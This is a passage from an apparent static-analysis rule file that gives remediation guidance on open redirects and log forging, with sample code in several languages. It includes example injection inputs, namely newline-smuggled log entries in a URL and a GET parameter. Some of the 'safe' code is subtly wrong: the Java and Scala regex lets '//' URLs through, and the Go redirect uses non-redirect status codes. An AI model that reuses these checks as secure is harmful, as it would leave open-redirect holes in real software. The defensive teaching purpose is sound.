used in the header function for redirection. To securely implement redirects, always validate the user-provided URLs before using them. Here's a secure way to handle redirects:\n\nphp\n<?php\nsession_start();\n\n// Assuming some form of user authentication\n$username = $_POST['username'];\n$password = $_POST['password'];\n\nif (!credentialsAreValid($username, $password)) {\n    $_SESSION['message'] = \"Incorrect credentials\";\n    header(\"Location: /login.php\");\n    exit;\n}\n\n$_SESSION['username'] = $username;\n\n$destination = $_GET['destination'];\n\n// Check if the destination URL is a relative path\nif (!isRelativeURL($destination)) {\n    $destination = \"/home.php\";\n}\n\nheader(\"Location: \" . $destination);\nexit;\n\n/**\n * Allow anything starting with \"/\", except paths starting \"//\" and \"/\\\\\".\n */\nfunction isRelativeURL($url) {\n    return preg_match('/^\\/[^\\/\\\\\\\\].*/', $url);\n}\n?>\n\n\nThe above PHP code checks if a given redirect URL is a relative path, starting with a single / character. URLs starting with // (interpreted by browsers as protocol agnostic) are also rejected to ensure safety.\n\n:::\n\n::::\n\n## Other Considerations\n\n* Redirects can happen in client-side JavaScript, too. Validate any code that updates window.location, to ensure the\n  URL is not taken from untrusted input.\n\n* Some sites insert *interstitial pages* when the user is leaving the site. This is a good defense against \"doppelganger\"\n  domains - websites that have a very similar domain name, that attempt to trick the user into sharing private \n  information. However, interstitial pages are a common place for open redirect vulnerabilities to occur. If you implement \n  an interstitial page that passes the URL in the query parameter, be sure to show the full URL to the user and require user\n  interaction before performing the redirect.\n\n* Social media and link-sharing sites often make use of redirects to do *click-counting*. URLs are chosen by the \n  community, then when a user clicks on the link, the click-through count is incremented, and the user is redirected to \n  their destination. In this situation, you are obligated to redirect the user to an external domains. Consider using a\n  different domain name for such a redirector that does not confer the same trust to users as your regular domain. Alternatively,\n  show a interstitial page (see previous point).\n\n* Some resources recommend checking the Referer or Origin headers in the HTTP\n  request. This is **not enough** - these may not be available for a variety of reasons:\n\n  + Links from external applications (e.g. email, messengers, PDF readers, Word\n    documents, ...) never have such headers\n\n  + External web sites can redirect through e.g. data: or blob: URLs or use\n    the sandbox attribute on iframes to prevent the browser from sending the\n    Referer or Origin headers.\n\n  + Various browser settings, firewalls and other privacy software can suppress\n    the submission of these headers.\n\n## Additional information\n\n**[CWE-601](https://cwe.mitre.org/data/definitions/601.html)**\n\n**[OWASP-A1](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)**.",
                "markdown": "Attacker-controlled data is not escaped and used in a HTTP redirect. This indicates an open redirect vulnerability. It may also allow for response splitting, session fixation or cross-site scripting attacks.\n\n# Open Redirects\n\nAn *HTTP redirect* is when a web-server returns an HTTP status code like 302 to tell the browser to make a request to a\ndifferent URL. Redirects can also be performed in client-side JavaScript code by updating the browser URL directly.\n\nRedirects are commonly used to push a user to an authentication page before viewing some protected content. In this \nscenario, the user will often be redirected again back to the original resource once they have successfully logged in. \n\nIf a redirect URL is pulled from a preceding HTTP request, you need to check the URL is safe before redirecting the\nuser. Typically, this means checking the URL is a **relative URL** to a resource hosted under your web domain. **Open \nredirects** - which allow a maliciously crafted link to redirect the user to arbitrary third-party domains - are often \nused by spammers to disguise harmful links in emails.\n\n::::tabs\n\n:::tab[Java]\n\n## Disallowing Offsite Redirects\n\nRelative links inside your site will always start with a single `/` character. You can prevent redirects to other \ndomains by checking the URL being passed to the redirect function. Examine how this Java application verifies the \nredirect URL:\n\n```java\n@Override\npublic void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n    String username = request.getParameter(\"username\");\n    String password = request.getParameter(\"password\");\n\n    if (!this.credentialsAreValid(username, password)) {\n        request.setAttribute(\"message\", \"Incorrect credentials\");\n        response.sendRedirect(\"/login\");\n        return;\n    }\n\n    HttpSession session = request.getSession(true);\n    session.setAttribute(\"username\", username);\n\n    String destination = request.getParameter(\"destination\");\n\n    if (destination == null || !this.isRelative(destination)) {\n        destination = \"/home\";\n    }\n\n    response.sendRedirect(destination);\n}\n\n/**\n * Allow anything starting with \"/\", except paths starting \"//\" and \"/\\\\\".\n */\nprivate boolean isRelative(String url) {\n    return url.matches(\"/[^/\\\\]?.*\");\n}\n```\n\nThis code makes sure all redirect URLs are relative paths URLs - i.e. they start with a single `/` character. (Note that\nURLs starting with `//` will be interpreted by the browser as a protocol agnostic, absolute URL - so they should be \nrejected too.) \n\n:::\n\n:::tab[Angular]\n\n## Disallowing Offsite Redirects\n\nClient-side frameworks like Angular often mimic server-side redirects by using typescript logic. There are a number of \nways of doing redirects in Angular code - updating the `window.location` directly, using the browser's history API, or \nusing the `Router` module:\n\n```typescript\n/**\n * An example of how to push the user to the login page if they attempt to access a sensitive\n * route before authenticating thmeselves.\n */\nexport class AuthGuard implements CanActivate {\n  constructor(private authService: AuthService, private router: Router) {}\n\n  canActivate(next: ActivatedRouteSnapshot, state: RouterStateSnapshot): Observable<true | UrlTree> {\n    \n    // Check whether the user is logged in.  \n    return this.authService.isLoggedIn().pipe(\n      map(isLoggedIn => {\n        if (!isLoggedIn) {\n            \n          // Redirect the user to the login page if they are not logged in.  \n          return this.router.parseUrl(`/login?destination=${state.url}`);\n        }\n\n        return true\n      })\n    )\n  }\n}\n```\n\nWhen performing a redirect, it is important to check that the URL you are redirecting to is a relative URL - that is, it \nstarts with a single `/` character:\n\n```typescript\nexport class LoginComponent {\n\n  // The username and password entered by the user in the login form.\n  username = '';\n  password = '';\n\n  // The destination URL to redirect the user to once they log in successfully.\n  destinationURL = '/feed'\n\n  constructor(private authService : AuthService,\n              private route       : ActivatedRoute,\n              private router      : Router) { }\n\n  ngOnInit() {\n    this.destinationURL = this.route.snapshot.queryParams['destination'] || '/feed';\n  }\n\n  onSubmit() {\n    this.authService.login(this.username, this.password)\n      .subscribe(\n        () => {\n          // After the user has lgged in, redirect them to their desired destination.\n          let url = this.destinationURL\n\n          // Confirm that the URL is a relative path - i.e. starting with a single '/' characters.\n          if (!url.match(/^\\/[^\\/\\\\]/)) {\n            url = '/feed'\n          }\n\n          this.router.navigate([ url ])\n        })\n  }\n}\n```\n\nThis code makes sure all redirect URLs are relative paths URLs - i.e. they start with a single `/` character. (Note that\nURLs starting with `//` will be interpreted by the browser as a protocol agnostic, absolute URL - so they should be \nrejected too.) \n\n:::\n\n:::tab[C#]\n\n## Disallowing Offsite Redirects\n\nRelative links inside your site will always start with a single `/` character. You can prevent redirects to other \ndomains by checking the URL being passed to the redirect function. Examine how this ASP.NET login action verifies the \nredirect URL:\n\n```csharp\n[HttpPost]\n[AllowAnonymous]\n[ValidateAntiForgeryToken]\npublic async Task<ActionResult> Login(string username, string password, [FromQuery] string returnUrl)\n{\n    var result = await SignInManager.PasswordSignInAsync(username, password, true, false);\n\n    if (result.Succeeded)\n    {\n        // Make sure this a URL within our website.\n        if (Url.IsLocalUrl(returnUrl))\n        {\n            return Redirect(returnUrl);\n        }\n        \n        return RedirectToAction(\"Home\");\n    }\n    \n    return View();\n}\n```\n\nThis code makes sure all redirect URLs are relative paths URLs - i.e. they start with a single `/` character. (Note that\nURLs starting with `//` will be interpreted by the browser as a protocol agnostic, absolute URL - so they will be \nrejected too.) \n\n:::\n\n:::tab[JavaScript]\n\n## Disallowing Offsite Redirects\n\nRelative links inside your site will always start with a single `/` character. You can prevent redirects to other \ndomains by checking the URL being passed to the redirect function. Examine how this Express application verifies the \nredirect URL:\n\n```javascript\nconst app = express()\n\napp.use(express.urlencoded())\napp.use(cookieParser('secret'))\napp.use(session({ cookie: { maxAge: 60000 }}))\napp.use(flash())\n\napp.post('/login', (request, response) => {\n  const username = request.body.username\n  const password = request.body.password\n\n  if (!usernameAndPasswordAreValid(username, password)) {\n    request.flash('message', 'Incorrect credentials')\n    response.redirect('/login')\n\n    return\n  }\n\n  // Log the user in.\n  request.session.user = username\n\n  // Check redirect URL is a relative path - otherwise just send the user to /home page.\n  const redirectURL = request.query.redirect\n\n  // Check the URL starts with a single / character.\n  if (redirectURL && redirectURL.match(/^\\/[^\\/\\\\]/)) {\n    response.redirect(redirectURL)\n  }\n  else {\n    response.redirect('/home')\n  }\n})\n```\n\nThis code makes sure all redirect URLs are relative paths URLs - i.e. they start with a single `/` character. (Note that\nURLs starting with `//` will be interpreted by the browser as a protocol agnostic, absolute URL - so they should be \nrejected too.) \n\n:::\n\n:::tab[Python]\n\n## Disallowing Offsite Redirects\n\nRelative links inside your site will always start with a single `/` character. You can prevent redirects to other \ndomains by checking the URL being passed to the redirect function. Examine how this Python application verifies the \nredirect URL:\n\n```python\n@app.route('/login', methods=['POST'])\ndef do_login():\n  username = request.form['username']\n  password = request.form['password']\n\n  user = find_user_with_password(username, password)\n\n  if not user:\n    flash('Invalid credentials', 'error')\n    return redirect('/login')\n\n  session['username'] = username\n\n  destination = request.args.get('destination')\n\n  if destination is None or not is_relative(destination):\n    destination = '/timeline'\n\n  return redirect(destination)\n\ndef is_relative(url):\n  return re.match(r\"^\\/[^\\/\\\\]\", url)\n```\n\nThis code makes sure all redirect URLs are relative paths URLs - i.e. they start with a single `/` character. (Note that\nURLs starting with `//` will be interpreted by the browser as a protocol agnostic, absolute URL - so they should be \nrejected too.) \n\n:::\n\n:::tab[React]\n\n## Disallowing Offsite Redirects\n\nThere are a number of ways of doing redirects in React code - updating the `window.location` directly, using the \nbrowser's history API, or using the `<Redirect>` component from the `react-router` module. Whichever method you use, it \nis important to check that the URL you are redirecting to is a relative URL - that is, it starts with a single `/` \ncharacter:\n\n```jsx\n/**\n * A wrapper for <Route> that redirects to /feed if the user is authenticated.\n */\nfunction UnauthenticatedRoute(props) {\n  if (!props.loggedIn) {\n    return <Route {...props} />\n  }\n\n  // If the user has just authenticated, check the query string for their intended destination.\n  const parsed = queryString.parse(props.location.search)\n\n  let url = '/feed'\n\n  // Ensure this is a relative URL within the site (i.e. it starts with a single / character.)\n  if (parsed.destination && parsed.destination.match(/^\\/[^\\/\\\\]/)) {\n    url = parsed.destination\n  }\n\n  return <Redirect to={{ pathname: url }} />\n}\n```\n\nThis code makes sure all redirect URLs are relative paths URLs - i.e. they start with a single `/` character. (Note that\nURLs starting with `//` will be interpreted by the browser as a protocol agnostic, absolute URL - so they should be \nrejected too.) \n\n:::\n\n:::tab[Scala]\n\n## Disallowing Offsite Redirects\n\nRelative links inside your site will always start with a single `/` character. You can prevent redirects to other \ndomains by checking the URL being passed to the redirect function. Examine how this Scala application verifies the \nredirect URL:\n\n```scala\nclass LoginController @Inject()(cc: ControllerComponents, users: UserRepository) extends AbstractController(cc) {\n\n  /**\n   * Process the response from the login page, safely checking for a redirect parameter.\n   */\n  def login = Action(parse.form(loginForm)) { request =>\n    val credentials = request.body\n\n    if (!users.credentialsAreValid(credentials.username, credentials.password)) {\n      Redirect(\"/login\").flashing(\"error\" -> \"Incorrect username or password.\")\n    }\n    else {\n      var next = request.getQueryString(\"destination\").getOrElse(\"/home\")\n\n      if (!isRelative(next)) {\n        next = \"/home\"\n      }\n\n      Redirect(next).withSession(request.session + (\"username\" -> credentials.username))\n    }\n  }\n\n  /**\n   * Allow anything starting with \"/\", except paths starting \"//\" and \"/\\\".\n   */\n  def isRelative(url : String) =  {\n    url.matches(\"/[^/\\\\]?.*\");\n  }\n\n  case class Credentials(username: String, password: String)\n\n  def loginForm = Form(\n    mapping(\n      \"username\" -> text,\n      \"password\" -> text\n    )(Credentials.apply)(Credentials.unapply)\n  )\n}\n```\n\nThis code makes sure all redirect URLs are relative paths URLs - i.e. they start with a single `/` character. (Note that\nURLs starting with `//` will be interpreted by the browser as a protocol agnostic, absolute URL - so they should be \nrejected too.) \n\n:::\n\n:::tab[Go]\n\n## Disallowing Offsite Redirects\n\nRelative links inside your site will always start with a single `/` character. You can prevent redirects to other \ndomains by checking the URL being passed to the redirect function. Examine how this Go application verifies the \nredirect URL:\n\n```go\nfunc LoginHandler(response http.ResponseWriter, request *http.Request) {\n  request.ParseForm()\n\n  session, _ := session.Get(request, \"session\")\n\n  username := request.Form.Get(\"username\")\n  password := request.Form.Get(\"password\")\n\n  user := findUserWithPassword(username, password)\n\n  if user == nil {\n    http.Redirect(response, request, \"/login\", http.StatusUnauthorized)\n    return\n  }\n\n  session.Values[\"username\"] = username\n  session.Save(request, response)\n\n  destination := request.URL.Query().Get(\"destination\")\n\n  // Protect against redirect attacks by checking the destination URL starts with a single / character.\n  if destination == \"\" {\n    destination = \"/home\"\n  } else {\n    isRelative, _ := regexp.MatchString(\"^/[^/]\", destination)\n\n    if !isRelative {\n      destination = \"/home\"\n    }\n  }\n\n  http.Redirect(response, request, destination, http.StatusOK)\n}\n```\n\nThis code makes sure all redirect URLs are relative paths URLs - i.e. they start with a single `/` character. (Note that\nURLs starting with `//` will be interpreted by the browser as a protocol agnostic, absolute URL - so they should be \nrejected too.) \n\n:::\n\n:::tab[PHP]\n\n## Disallowing Offsite Redirects in PHP\n\nOpen redirects in PHP are commonly introduced when user input is improperly used in the `header` function for redirection. To securely implement redirects, always validate the user-provided URLs before using them. Here's a secure way to handle redirects:\n\n```php\n<?php\nsession_start();\n\n// Assuming some form of user authentication\n$username = $_POST['username'];\n$password = $_POST['password'];\n\nif (!credentialsAreValid($username, $password)) {\n    $_SESSION['message'] = \"Incorrect credentials\";\n    header(\"Location: /login.php\");\n    exit;\n}\n\n$_SESSION['username'] = $username;\n\n$destination = $_GET['destination'];\n\n// Check if the destination URL is a relative path\nif (!isRelativeURL($destination)) {\n    $destination = \"/home.php\";\n}\n\nheader(\"Location: \" . $destination);\nexit;\n\n/**\n * Allow anything starting with \"/\", except paths starting \"//\" and \"/\\\\\".\n */\nfunction isRelativeURL($url) {\n    return preg_match('/^\\/[^\\/\\\\\\\\].*/', $url);\n}\n?>\n```\n\nThe above PHP code checks if a given redirect URL is a relative path, starting with a single `/` character. URLs starting with `//` (interpreted by browsers as protocol agnostic) are also rejected to ensure safety.\n\n:::\n\n::::\n\n## Other Considerations\n\n* Redirects can happen in client-side JavaScript, too. Validate any code that updates `window.location`, to ensure the\n  URL is not taken from untrusted input.\n\n* Some sites insert *interstitial pages* when the user is leaving the site. This is a good defense against \"doppelganger\"\n  domains - websites that have a very similar domain name, that attempt to trick the user into sharing private \n  information. However, interstitial pages are a common place for open redirect vulnerabilities to occur. If you implement \n  an interstitial page that passes the URL in the query parameter, be sure to show the full URL to the user and require user\n  interaction before performing the redirect.\n\n* Social media and link-sharing sites often make use of redirects to do *click-counting*. URLs are chosen by the \n  community, then when a user clicks on the link, the click-through count is incremented, and the user is redirected to \n  their destination. In this situation, you are obligated to redirect the user to an external domains. Consider using a\n  different domain name for such a redirector that does not confer the same trust to users as your regular domain. Alternatively,\n  show a interstitial page (see previous point).\n\n* Some resources recommend checking the `Referer` or `Origin` headers in the HTTP\n  request. This is **not enough** - these may not be available for a variety of reasons:\n\n  + Links from external applications (e.g. email, messengers, PDF readers, Word\n    documents, ...) never have such headers\n\n  + External web sites can redirect through e.g. `data:` or `blob:` URLs or use\n    the `sandbox` attribute on iframes to prevent the browser from sending the\n    `Referer` or `Origin` headers.\n\n  + Various browser settings, firewalls and other privacy software can suppress\n    the submission of these headers.\n\n## Additional information\n\n**[CWE-601](https://cwe.mitre.org/data/definitions/601.html)**\n\n**[OWASP-A1](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)**."
              },
              "name": "OpenRedirect",
              "properties": {
                "tags": [
                  "ng-sast"
                ],
                "precision": "very-high"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "fullDescription": {
                "text": "Attacker-controlled data is not escaped and used in a HTTP redirect. This indicates an open redirect vulnerability. It may also allow for response splitting, session fixation or cross-site scripting attacks."
              },
              "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
              "shortDescription": {
                "text": "Open Redirect"
              }
            },
            {
              "id": "log-forging-attacker",
              "help": {
                "text": "The application writes attacker-controlled data directly to a log file.\n\n# Log Forging\n\n**Log Forging** is a type of *injection attack*. Injection attacks occur when maliciously crafted inputs are\nsubmitted by an attacker, causing an application to perform an unintended action. Log forging attacks occur when\nan attacker tricks the application into writing spurious or malicious entries in your log files.\n\nLog files are an important tool for seeing what an application is doing at runtime, reviewing events, and recording errors. \nMuch of the data written to log files will come from untrusted sources - log entries will contain URLs accessed on the\nserver or parameters passed in an HTTP request, for example. This affords an attacker an opportunity to inject spurious\nlog entries (if newline characters are not handled appropriately) or inject malicious code that may prove harmful when\nthe logs are viewed. Log forging is often used in tandem with other attacks as a way of disguising malicious activity\non the server.\n\n::::tabs\n\n:::tab[Java]\n\n## Log Forging in Java\n\nIn Java, writing to the standard console log will not escape new line characters. That means that if you execute\nthe following:\n\njava\nSystem.out.println('Hello\\nworld')\n\n\n...you will get two lines of output. Attackers will try to make use of this by inserting new line characters into the\nparameters in their HTTP requests to add extra lines of logging. They might, for instance, make HTTP requests to the URL\n/login?\\nUser+logged+out, so that any code that logs the URL also prints the line User logged out. This can be \nhelpful for an attacker if they want to disguise their tracks.\n\nThe best way to defuse log forging attacks is to use a logging module that does\nnot write unstructured text files. These packages also have a multitude of other\nadvantages: the verbosity of the logging can be set by configuration, and logs\ncan be written in a structured format like JSON for easy processing by log\nmanagement tools like Splunk and Logstash.\n\nFor example, Log4j2 can be configured for structured JSON output with a\nconfiguration file like this:\n\nxml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Configuration>\n    <Appenders>\n        <Console name=\"Console\" target=\"SYSTEM_OUT\">\n            <JSONLayout />\n        </Console>\n    </Appenders>\n\n    <Loggers>\n        <Root level=\"INFO\">\n            <AppenderRef ref=\"Console\"/>\n        </Root>\n    </Loggers>\n</Configuration>\n\n\n:::\n\n:::tab[C#]\n\n## Log Forging in C#\n\nIn C#, writing to the standard console log will not escape new line characters. That means that if you execute\nthe following:\n\ncsharp\nConsole.WriteLine(\"Hello\\nworld\");\n\n\n...you will get two lines of output. Attackers will try to make use of this by inserting new line characters into the\nparameters in their HTTP requests to add extra lines of logging. They might, for instance, make HTTP requests to the URL\n/login?\\nUser+logged+out, so that any code that logs the URL also prints the line User logged out. This can be \nhelpful for an attacker if they want to disguise their tracks.\n\nThe best way to defuse log forging attacks is to store logs in a structured log format. Line-delimited text files are easy to use,\nbut require boilerplate when logging to defuse attacker-controlled inputs.\nLogging in a structured format like JSON avoids this problem and also allows for powerful filtering and querying\nby log management tools like Splunk and Logstash.\n\nThe built-in .NET logging API can be used to achieve this end. A .NET application can be configured to have logging\nobjects supplied by dependency injection:\n\ncsharp\nusing Microsoft.Extensions.Logging;\n\nnamespace WebApplication.Controllers\n{\n    public class HomeController : Controller\n    {\n        private readonly ILogger<HomeController> _logger;\n\n        public HomeController(ILogger<HomeController> logger)\n        {\n            _logger = logger;\n            _logger.LogInformation(\"Logs initialized!\");\n        }\n    }\n}\n\n\nThe log level and formatting can then be configured in the appsettings.json file for the project:\n\njson\n{\n  \"Logging\": {\n    \"LogLevel\": {\n      \"Default\": \"Information\",\n      \"Microsoft\": \"Warning\",\n      \"Microsoft.Hosting.Lifetime\": \"Information\"\n    },\n    \"Console\": {\n      \"LogLevel\": {\n        \"Default\": \"Information\",\n        \"Microsoft\": \"Warning\",\n        \"Microsoft.Hosting.Lifetime\": \"Information\"\n      },\n      \"FormatterName\": \"json\",\n      \"FormatterOptions\": {\n        \"SingleLine\": true,\n        \"IncludeScopes\": true,\n        \"TimestampFormat\": \"HH:mm:ss \",\n        \"UseUtcTimestamp\": true,\n        \"JsonWriterOptions\": {\n          \"Indented\": true\n        }\n      }\n    }\n  }\n}\n\n\nThis will prefix each line of logging with a timestamp and the name of the class emitting log information.\n\n:::\n\n:::tab[JavaScript]\n\n## Log Forging in Node.js\n\nIn JavaScript, writing to the standard console log will not escape new line characters. That means that if you execute\nthe following:\n\njavascript\nconsole.log('Hello\\nworld')\n\n\n...you will get two lines of output. Attackers will try to make use of this by inserting new line characters into the\nparameters in their HTTP requests to add extra lines of logging. They might, for instance, make HTTP requests to the URL\n/login?\\nUser+logged+out, so that any code that logs the URL also prints the line User logged out. This can be \nhelpful for an attacker if they want to disguise their tracks.\n\nThe best way to defuse log forging attacks is to use a logging module that does\nnot write unstructured text files. These packages also have a multitude of other\nadvantages: the verbosity of the logging can be set by configuration, and logs\ncan be written in a structured format like JSON for easy processing by log\nmanagement tools like Splunk and Logstash.\n\nBunyan is an example of a logging library for Node.js that supports structured\nlogging:\n\njavascript\n  // Logs will be in JSON format.\n  const log = require('bunyan').createLogger({ name: \"example\" })\n\n  /**\n   * This logging will output\n   *   {\"name\":\"example\",\"hostname\":\"HOSTNAME\",\"pid\":PROCESS_ID,\"level\":30,\"msg\":\"Hello\\nworld\",\"time\":\"TIMESTAMP\",\"v\":0}\n   */\n  log.info('Hello\\nworld')\n\n\n:::\n\n:::tab[Python]\n\n## Log Forging in Python\n\nIn Python, writing to the standard console log will not escape new line characters. That means that if you execute\nthe following:\n\npython\nprint(\"Hello\\nworld\")\n\n\n...you will get two lines of output. Attackers will try to make use of this by inserting new line characters into the\nparameters in their HTTP requests to add extra lines of logging. They might, for instance, make HTTP requests to the URL\n/login?\\nUser+logged+out, so that any code that logs the URL also prints the line User logged out. This can be \nhelpful for an attacker if they want to disguise their tracks.\n\nThe best way to defuse log forging attacks is to use a logging module that does\nnot write unstructured text files. These packages also have a multitude of other\nadvantages: the verbosity of the logging can be set by configuration, and logs\ncan be written in a structured format like JSON for easy processing by log\nmanagement tools like Splunk and Logstash.\n\nIn order to do structured logging with the built-in Python logging module, you\nneed to configure a custom formatter like here:\n\npython\nimport json\nimport logging\nimport sys\n\nlogger=logging.getLogger()\nlogger.setLevel(logging.DEBUG)\n\nclass JsonFormatter(logging.Formatter):\n    def format(self, record):\n        field_names = (\n            'created',\n            'filename',\n            'funcName',\n            'levelname',\n            'levelno',\n            'lineno',\n            'msg',\n            'module',\n            'msecs',\n            'name',\n            'pathname',\n            'process',\n            'processName',\n            'relativeCreated',\n            'thread',\n            'threadName',\n            'taskName',\n        )\n        return json.dumps({ field_name: ('{0.' + field_name + '}').format(record) for field_name in field_names })\n\nhandler=logging.StreamHandler(sys.stderr)\nhandler.setFormatter(JsonFormatter())\n\nlogger.addHandler(handler)\n\nlogging.info(\"abcd\")\n# will print something like\n# {\"created\": \"1709053589.5001647\", \"filename\": \"<filename>\", \"funcName\": \"<module>\", \"levelname\": \"INFO\", \"levelno\": \"20\", \"lineno\": \"41\", \"msg\": \"abcd\", \"module\": \"<filename>\", \"msecs\": \"500.0\", \"name\": \"root\", \"pathname\": \"<filename>\", \"process\": \"140750\", \"processName\": \"MainProcess\", \"relativeCreated\": \"1985.8925342559814\", \"thread\": \"140257496983360\", \"threadName\": \"MainThread\", \"taskName\": \"None\"}\n\n\n:::\n\n:::tab[Scala]\n\n## Log Forging in Scala\n\nIn Scala, writing to the standard console log will not escape new line characters. That means that if you execute\nthe following:\n\nscala\nprintln(\"Hello\\nworld\")\n\n\n...you will get two lines of output. Attackers will try to make use of this by inserting new line characters into the\nparameters in their HTTP requests to add extra lines of logging. They might, for instance, make HTTP requests to the URL\n/login?\\nUser+logged+out, so that any code that logs the URL also prints the line User logged out. This can be \nhelpful for an attacker if they want to disguise their tracks.\n\nThe best way to defuse log forging attacks is to use a logging module that does\nnot write unstructured text files. These packages also have a multitude of other\nadvantages: the verbosity of the logging can be set by configuration, and logs\ncan be written in a structured format like JSON for easy processing by log\nmanagement tools like Splunk and Logstash.\n\nFor example, Log4j2 can be configured for structured JSON output with a\nconfiguration file like this:\n\nxml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Configuration>\n    <Appenders>\n        <Console name=\"Console\" target=\"SYSTEM_OUT\">\n            <JSONLayout />\n        </Console>\n    </Appenders>\n\n    <Loggers>\n        <Root level=\"INFO\">\n            <AppenderRef ref=\"Console\"/>\n        </Root>\n    </Loggers>\n</Configuration>\n\n\n:::\n\n:::tab[Go]\n\n## Log Forging in Go\n\nIn Go, writing to the standard console log will not escape new line characters. That means that if you execute\nthe following:\n\ngo\nfmt.Println(\"Hello\\nworld\")\n\n\n...you will get two lines of output. Attackers will try to make use of this by inserting new line characters into the\nparameters in their HTTP requests to add extra lines of logging. They might, for instance, make HTTP requests to the URL\n/login?\\nUser+logged+out, so that any code that logs the URL also prints the line User logged out. This can be \nhelpful for an attacker if they want to disguise their tracks.\n\nThe best way to defuse log forging attacks is to use a logging module that does\nnot write unstructured text files. These packages also have a multitude of other\nadvantages: the verbosity of the logging can be set by configuration, and logs\ncan be written in a structured format like JSON for easy processing by log\nmanagement tools like Splunk and Logstash.\n\nThe log/slog supports structured logging like in this example:\n\ngo\npackage main\n\nimport \"log/slog\"\n\nfunc main() {\n    logger := slog.New(slog.NewJSONHandler(os.Stdout, nil))\n    logger.Info(\"hello, world\", \"user\", os.Getenv(\"USER\"))\n    // prints something like\n    // {\"time\":\"2023-08-04T16:58:02.939245411-04:00\",\"level\":\"INFO\",\"msg\":\"hello, world\",\"user\":\"jba\"}\n}\n\n\n:::\n\n:::tab[PHP]\n\n## Log Forging in PHP\n\nIn PHP, logging is typically done by appending to files or sending messages to syslog. Just like in other languages, it's crucial to sanitize inputs that are written to logs in PHP to avoid log forging attacks.\n\nConsider the following naive PHP logging mechanism:\n\nphp\n$message = $_GET['message'];\nfile_put_contents(\"/var/log/myapp.log\", $message . \"\\n\", FILE_APPEND);\n\n\nIf an attacker sends a GET request with message=Legitimate log entry\\nMalicious log entry, the malicious log entry would also be appended to the log, potentially hiding or disguising malicious activities or even causing confusion during a forensic investigation.\n\n## Mitigation\n\nTo prevent log forging in PHP:\n\n1. Always sanitize and validate any data that gets written to logs.\n2. Avoid directly logging user-controlled data.\n3. Use established logging libraries that offer structured logging and have built-in protection against log forging.\n\nHere's an example using the popular Monolog logging library in PHP:\n\nphp\nrequire 'vendor/autoload.php';\n\nuse Monolog\\Formatter\\JsonFormatter;\nuse Monolog\\Handler\\StreamHandler;\nuse Monolog\\Logger;\n\n$logger = new Logger('my_logger');\n$handler = new StreamHandler('/var/log/myapp.log');\n$handler->setFormatter(new JsonFormatter());\n$logger->pushHandler($handler);\n\n// and then where ever in the code\n$logger->info('message', [\"value\" => $_GET['value']]);\n\n// it will result in a parsable output similar to this:\n// {\n//   \"message\":\"message\",\n//   \"context\": {\n//      \"value\":\"...GET input...\", \n//   }, \n//   \"level\":200, \n//   \"level_name\":\"INFO\",  \n//   \"channel\":\"my_logger\",\n//   \"datetime\":\"2021-06-25T10:54:10.116817+00:00\",\n//   \"extra\":{}\n// }\n\n\nWhen using Monolog, it automatically handles the structure of the log and the sanitization of potentially harmful characters, reducing the risk of log forging. Moreover, structured logs can be parsed more easily by log management tools and are less susceptible to log forging in general.\n\n:::\n\n::::\n\n\n## Malicious Content in Logs\n\nAn attacker can always control what is written to the logs by manipulating the HTTP request. A common attack vector is\nto inject HTML into log entries, in the hope that an administrator views the log files in a web application that does \nnot properly escape HTML characters. If you make use of a tool to view logs or error reports, treat the contents of log \nfiles as untrusted input as you would the original HTTP request - or you could fall-foul of cross-site scripting \nattacks aimed at hijacking admin accounts.\n\n## CWEs\n \n* [CWE-117](https://cwe.mitre.org/data/definitions/117.html).",
                "markdown": "The application writes attacker-controlled data directly to a log file.\n\n# Log Forging\n\n**Log Forging** is a type of *injection attack*. Injection attacks occur when maliciously crafted inputs are\nsubmitted by an attacker, causing an application to perform an unintended action. Log forging attacks occur when\nan attacker tricks the application into writing spurious or malicious entries in your log files.\n\nLog files are an important tool for seeing what an application is doing at runtime, reviewing events, and recording errors. \nMuch of the data written to log files will come from untrusted sources - log entries will contain URLs accessed on the\nserver or parameters passed in an HTTP request, for example. This affords an attacker an opportunity to inject spurious\nlog entries (if newline characters are not handled appropriately) or inject malicious code that may prove harmful when\nthe logs are viewed. Log forging is often used in tandem with other attacks as a way of disguising malicious activity\non the server.\n\n::::tabs\n\n:::tab[Java]\n\n## Log Forging in Java\n\nIn Java, writing to the standard console log will not escape new line characters. That means that if you execute\nthe following:\n\n```java\nSystem.out.println('Hello\\nworld')\n```\n\n...you will get two lines of output. Attackers will try to make use of this by inserting new line characters into the\nparameters in their HTTP requests to add extra lines of logging. They might, for instance, make HTTP requests to the URL\n`/login?\\nUser+logged+out`, so that any code that logs the URL also prints the line `User logged out`. This can be \nhelpful for an attacker if they want to disguise their tracks.\n\nThe best way to defuse log forging attacks is to use a logging module that does\nnot write unstructured text files. These packages also have a multitude of other\nadvantages: the verbosity of the logging can be set by configuration, and logs\ncan be written in a structured format like JSON for easy processing by log\nmanagement tools like Splunk and Logstash.\n\nFor example, Log4j2 can be configured for structured JSON output with a\nconfiguration file like this:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Configuration>\n    <Appenders>\n        <Console name=\"Console\" target=\"SYSTEM_OUT\">\n            <JSONLayout />\n        </Console>\n    </Appenders>\n\n    <Loggers>\n        <Root level=\"INFO\">\n            <AppenderRef ref=\"Console\"/>\n        </Root>\n    </Loggers>\n</Configuration>\n```\n\n:::\n\n:::tab[C#]\n\n## Log Forging in C#\n\nIn C#, writing to the standard console log will not escape new line characters. That means that if you execute\nthe following:\n\n```csharp\nConsole.WriteLine(\"Hello\\nworld\");\n```\n\n...you will get two lines of output. Attackers will try to make use of this by inserting new line characters into the\nparameters in their HTTP requests to add extra lines of logging. They might, for instance, make HTTP requests to the URL\n`/login?\\nUser+logged+out`, so that any code that logs the URL also prints the line `User logged out`. This can be \nhelpful for an attacker if they want to disguise their tracks.\n\nThe best way to defuse log forging attacks is to store logs in a structured log format. Line-delimited text files are easy to use,\nbut require boilerplate when logging to defuse attacker-controlled inputs.\nLogging in a structured format like JSON avoids this problem and also allows for powerful filtering and querying\nby log management tools like Splunk and Logstash.\n\nThe built-in .NET logging API can be used to achieve this end. A .NET application can be configured to have logging\nobjects supplied by 